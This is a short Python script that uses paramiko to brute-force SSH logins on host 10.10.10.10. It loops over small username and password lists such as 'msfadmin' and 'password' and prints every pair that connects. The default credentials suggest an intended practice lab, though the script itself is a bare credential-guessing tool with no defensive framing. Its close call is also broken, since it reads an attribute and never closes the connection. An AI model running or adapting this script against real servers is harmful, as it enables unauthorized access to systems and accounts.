import paramiko 

client= paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
username_list=["msfadmin","password"]
password_list=["msfadmin","password"]

for i in username_list:
    for j in password_list:
        try:
            sonuc= client.connect("10.10.10.10",username=i,password=j)
            client.close.__annotations__
            print("username:",i,"password:",j)
        except:
            pass
            

